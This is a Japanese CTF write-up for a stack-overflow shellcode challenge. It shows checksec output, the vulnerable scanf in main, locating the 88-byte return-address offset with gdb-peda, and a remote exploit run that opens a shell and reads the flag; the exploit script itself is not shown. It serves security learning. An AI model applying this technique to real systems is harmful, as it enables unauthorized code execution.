setodaNote CTF Exhibition の Pwn の Shellcode という問題

動作確認

$ file shellcode
shellcode: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dfb33311207161fab6bf4b8dcd84364df9b280a, for GNU/Linux 3.2.0, not stripped

$ ../../../tools/checksec.sh-2.7.1/checksec --file=./shellcode
RELRO           STACK CANARY      NX            PIE          RPATH      RUNPATH      Symbols     FORTIFY  Fortified  Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   PIE enabled  No RPATH   No RUNPATH   68 Symbols  No       0          1            ./shellcode

$ ./shellcode
       |
target | [0x7ffdb96913f0]
       |
Well. Ready for the shellcode?
> aa
aa

Ghidra で見てみます。main関数だけのようです。秘密の関数も特にありません。

スタックの配列の先頭アドレスが表示されているということ。

ASLR が有効ですが、アドレスを表示してくれているので、それを使えばリターンアドレスを上書きできそうです。

undefined8 main(void)
{
  char local_58 [80];
  
  setvbuf(stdout,local_58,2,0x50);
  puts("       |");
  printf("target | [%p]\n",local_58);
  puts("       |");
  printf("Well. Ready for the shellcode?\n> ");
  __isoc99_scanf("%[^\n]",local_58);
  puts(local_58);
  return 0;
}

表示されたアドレスを使って、リターンアドレスの格納されているアドレスを計算する必要があるので、
コマンドラインでは難しい（> のところでバイナリを入力できないため）ので、pwntools を使って、エクスプロイトコードを書いていきます。

GDB の pattern を使って、スタックの配列（local_58）の先頭から、main関数のリターンアドレスまでのアドレスの差分を求めておきます。

アドレスの差分は、88byte ということが分かりました。

$ gdb -q shellcode

gdb-peda$ pattc 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /home/user/svn/experiment/setodaNoteCTF/Pwn/shellcode
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
       |
target | [0x7fffffffe1b0]
       |
Well. Ready for the shellcode?
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x7fffffffe318 --> 0x7fffffffe599 ("/home/user/svn/experiment/setodaNoteCTF/Pwn/shellcode")
RCX: 0x7ffff7ec1240 (<__GI___libc_write+16>:    cmp    rax,0xfffffffffffff000)
RDX: 0x1
RSI: 0x1
RDI: 0x7ffff7f9da10 --> 0x0
RBP: 0x3541416641414a41 ('AJAAfAA5')
RSP: 0x7fffffffe208 ("AAKAAgAA6AAL")
RIP: 0x5555555551f5 (<main+144>:        ret)
R8 : 0x0
R9 : 0x7ffff7f9ba80 --> 0xfbad2288
R10: 0xffffffff
R11: 0x202
R12: 0x0
R13: 0x7fffffffe328 --> 0x7fffffffe5cf ("SHELL=/bin/bash")
R14: 0x0
R15: 0x7ffff7ffd020 --> 0x7ffff7ffe2e0 --> 0x555555554000 --> 0x10102464c457f
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x5555555551ea <main+133>:   call   0x555555555030 <puts@plt>
   0x5555555551ef <main+138>:   mov    eax,0x0
   0x5555555551f4 <main+143>:   leave
=> 0x5555555551f5 <main+144>:   ret
   0x5555555551f6:      cs nop WORD PTR [rax+rax*1+0x0]
   0x555555555200 <__libc_csu_init>:    push   r15
   0x555555555202 <__libc_csu_init+2>:  lea    r15,[rip+0x2bdf]        # 0x555555557de8
   0x555555555209 <__libc_csu_init+9>:  push   r14
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe208 ("AAKAAgAA6AAL")
0008| 0x7fffffffe210 --> 0x4c414136 ('6AAL')
0016| 0x7fffffffe218 --> 0x555555555165 (<main>:        push   rbp)
0024| 0x7fffffffe220 --> 0x100000000
0032| 0x7fffffffe228 --> 0x7fffffffe318 --> 0x7fffffffe599 ("/home/user/svn/experiment/setodaNoteCTF/Pwn/shellcode")
0040| 0x7fffffffe230 --> 0x7fffffffe318 --> 0x7fffffffe599 ("/home/user/svn/experiment/setodaNoteCTF/Pwn/shellcode")
0048| 0x7fffffffe238 --> 0x8a1fede9d50fe8d1
0056| 0x7fffffffe240 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00005555555551f5 in main ()
gdb-peda$ patto AAKAAgAA6AAL
AAKAAgAA6AAL found at offset: 88

tmp.pyが実装したエクスプロイトコードです。

実行します。

$ python tmp.py
[+] Opening connection to nc.ctf.setodanote.net on port 26503: Done
[*] Switching to interactive mode
INFO:pwnlib.tubes.remote.remote.140495907052240:Switching to interactive mode
\xb8;
$ ls
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ find home -name '*flag*'
home/user/flag
$ cat home/user/flag
flag{It_is_our_ch0ices_that_show_what_w3_truly_are_far_m0re_thAn_our_abi1ities}

tmp_nNULL.pyでは、NULL文字を使わないように対応した
